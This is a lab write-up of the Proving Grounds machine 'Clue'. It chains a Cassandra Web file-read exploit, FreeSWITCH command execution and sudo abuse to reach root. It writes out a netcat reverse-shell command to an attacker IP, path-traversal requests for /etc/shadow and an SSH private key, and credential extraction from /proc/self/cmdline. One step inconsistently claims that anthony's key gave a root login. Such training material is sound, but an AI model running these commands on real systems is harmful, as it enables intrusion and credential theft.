
# Report-Clue

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Clue

Target IP Address: 192.168.227.240

Operating System: Linux

## Information Gathering:

Full Nmap scan of all ports:

```bash
nmap -sC -sV -p- $ip
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 17:45 +0100
Nmap scan report for 192.168.227.240
Host is up (0.034s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE          VERSION
22/tcp   open   ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open   http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open   netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
445/tcp  closed microsoft-ds
3000/tcp open   http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open   freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-01-20T11:47:55-05:00
| smb2-time: 
|   date: 2026-01-20T16:47:58
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.04 seconds

```

Enumeration of port 80 using a browser:

<img width="707" height="269" alt="Pasted image 20260120175313" src="https://github.com/user-attachments/assets/750f533b-8fe5-4625-8cb5-7bbf59fa3d77" />

Enumeration of port3000 using a browser:
<img width="1283" height="736" alt="Pasted image 20260120175358" src="https://github.com/user-attachments/assets/183fdb20-b6a8-4814-abea-af4f4e5f3c9b" />


Enumeration of the HTTP service running on port 3000 was performed using a web browser. 
The service was identified as "Cassandra Web", exposing a web-based interface used to interact with a Cassandra database cluster.

<img width="1283" height="736" alt="Pasted image 20260120175415" src="https://github.com/user-attachments/assets/0ea187c0-5f5b-4661-ba89-fb7e17940d39" />

<img width="906" height="620" alt="Pasted image 20260120175855" src="https://github.com/user-attachments/assets/f037535d-67a9-4404-bf54-13e4f2e8b028" />

Searching Exploit-DB for PoC on Cassandra's vulnerability: 

Proof of concept Code:https://www.exploit-db.com/exploits/49362


## Initial Access

## 1)Vulnerability Exploited: Cassandra Web 0.5.0 - Remote File Read

Vulnerability Explanation: The Cassandra Web application exposed on port 3000 allowed unauthenticated access to its functionality. 
A vulnerability in the application permitted arbitrary file read on the underlying filesystem, 
allowing sensitive files to be retrieved remotely.

### Exploitation:

The identified arbitrary file read vulnerability was exploited using a publicly available proof-of-concept script. 
As an initial step, the /etc/passwd file was retrieved to enumerate local users present on the system.

```bash
 python3 49362.py $ip /etc/passwd 
```
<img width="750" height="573" alt="Pasted image 20260120181352" src="https://github.com/user-attachments/assets/011754f8-8275-4476-a04e-ab8370f92ad1" />


During analysis of the proof-of-concept documentation, it was noted that the Cassandra Web application passes authentication credentials via command-line arguments when starting the service. These arguments are exposed through the /proc/self/cmdline file.

<img width="752" height="333" alt="Pasted image 20260120181945" src="https://github.com/user-attachments/assets/1fe50d68-eeb0-4494-8ac4-241f58f652f2" />

By leveraging the arbitrary file read vulnerability, the /proc/self/cmdline file was retrieved, revealing cleartext credentials used by the Cassandra Web service.

```bash
python3 49362.py $ip /proc/self/cmdline
```
<img width="624" height="80" alt="Pasted image 20260120181959" src="https://github.com/user-attachments/assets/4704eb52-54cd-40b1-b039-42cc4bcfa1d9" />


The extracted credentials were subsequently used to authenticate to the Cassandra Web interface, resulting in 
authenticated access to the application.

## 2)Vulnerability Exploited: FreeSWITCH 1.10.1 Command Execution

Vulnerability Explanation: The FreeSWITCH service exposed on port 8021 allowed remote command execution through the event socket interface. 
By authenticating to the service, arbitrary system commands could be executed with the privileges of the FreeSWITCH user.

Exploitation:

During service enumeration, the FreeSWITCH mod_event_socket service was identified on port 8021. 
A publicly available proof-of-concept exploit was used to interact with the service and execute system commands.

Official FreeSWITCH documentation indicates that event socket credentials are stored in the event_socket.conf.xml file within the autoload_configs directory. Local enumeration revealed the absolute path to be /etc/freeswitch/autoload_configs/event_socket.conf.xml, which was then retrieved.

https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_event_socket_1048924/
<img width="1114" height="911" alt="Pasted image 20260120195617" src="https://github.com/user-attachments/assets/be68eb88-d03a-45a8-8fd7-58d7cde78caf" />

<img width="678" height="191" alt="Pasted image 20260120192113" src="https://github.com/user-attachments/assets/ef574d69-6f62-4e3f-a995-20bb916d0bbd" />

The exploit required authentication to the FreeSWITCH event socket. 
Credentials previously extracted from the /etc/freeswitch/autoload_config/event_socket.conf.xml file were used to successfully authenticate.

<img width="635" height="532" alt="Pasted image 20260120182747" src="https://github.com/user-attachments/assets/9d7dc9ee-437c-4aab-91c7-10d2eca0899e" />
After successful authentication, arbitrary commands were executed to confirm code execution, 
followed by the execution of a reverse shell payload.

```bash
python3 47799.py $ip id
```
```bash
python3 47799.py $ip whoami
```
```bash
python3 47799.py $ip "busybox nc 192.168.45.234 80 -e /bin/bash"
```
<img width="567" height="380" alt="Pasted image 20260120183139" src="https://github.com/user-attachments/assets/39428f0b-1587-453b-ad0e-1c6d82ddcd09" />

<img width="567" height="157" alt="Pasted image 20260120183159" src="https://github.com/user-attachments/assets/65adba22-a876-45dc-8ca9-52856960f12e" />


## 1) Privilege Escalation – freeswitch → cassie
 
### Vulnerability Exploited: Credential Reuse`

Vulnerability Explanation:  Credentials previously obtained from the system were reused to switch from the low-privileged "freeswitch" user to the user "cassie".  This allowed lateral movement to a higher-privileged local user account.`

### Enumeration:

Using the credentials recovered earlier, a local user switch was performed from the "freeswitch" account to the "cassie" account.

<img width="554" height="91" alt="Pasted image 20260120183357" src="https://github.com/user-attachments/assets/c8f16b67-b3d1-4083-8701-10888f3a189a" />

Successful authentication was achieved, resulting in access as the user "cassie".

<img width="674" height="132" alt="Pasted image 20260120185029" src="https://github.com/user-attachments/assets/2a6f9c4d-e0a4-4f85-ac90-a81876eda978" />

The sudo configuration revealed that the user "cassie" could execute /usr/local/bin/cassandra-web as root without authentication.

<img width="985" height="314" alt="Pasted image 20260120185100" src="https://github.com/user-attachments/assets/a8375bbc-3e0a-4b00-97de-dcf57146208e" />

### Exploitation:

The Cassandra Web binary was executed with elevated privileges using sudo. 
Custom parameters were supplied to bind the service to an attacker-controlled port and authenticate using valid credentials.

<img width="828" height="252" alt="Pasted image 20260120185119" src="https://github.com/user-attachments/assets/17598506-cf1b-485c-9271-3950eed2607d" />

<img width="846" height="117" alt="Pasted image 20260120185221" src="https://github.com/user-attachments/assets/8051d5a1-dd6d-485b-ab21-69019c318baf" />

As a result, the Cassandra Web service was started with root privileges.

## 2) Privilege Escalation - cassie → root

### Vulnerability Exploited: Abuse of Sudo Privileges to Re-execute a Vulnerable Service as Root

Vulnerability Explanation:

The user "cassie" was permitted to execute the Cassandra Web application as root without authentication. 
Cassandra Web was previously identified as vulnerable to arbitrary file read. 

By re-launching the vulnerable service with elevated privileges, the same vulnerability could be exploited in a higher-privileged context, resulting in access to sensitive files owned by the root user and leading to full privilege escalation.

### Enumeration:

Using the sudo misconfiguration, the Cassandra Web service was started with root privileges. 
The previously identified arbitrary file read vulnerability was then exploited again to access root-owned files, resulting in full privilege escalation.

The /etc/shadow file was successfully retrieved, confirming read access to root-protected files.
<img width="1101" height="521" alt="Pasted image 20260120185241" src="https://github.com/user-attachments/assets/b04da9e5-c805-4c7e-9f15-6e872a1f3eec" />

Further analysis revealed that the user "anthony" had an SSH private key stored on the system. 
The private key was retrieved via the same arbitrary file read vulnerability.
```bash
curl --path-as-is http://localhost:4444/../../../../../../home/anthony/.ssh/id_rsa
```

<img width="828" height="480" alt="Pasted image 20260120185300" src="https://github.com/user-attachments/assets/2c135692-152a-4705-aab2-2c8a8d7ddd22" />

### Exploitation:

The recovered private key was then used to authenticate via SSH as the root user.
```bash
ssh -i id_rsa anthony@192.168.227.240
```

<img width="625" height="330" alt="Pasted image 20260120185442" src="https://github.com/user-attachments/assets/3b9f2b0b-5c77-49ee-bccd-da714dbc4471" />


A successful SSH session was established with root privileges, completing the privilege escalation.
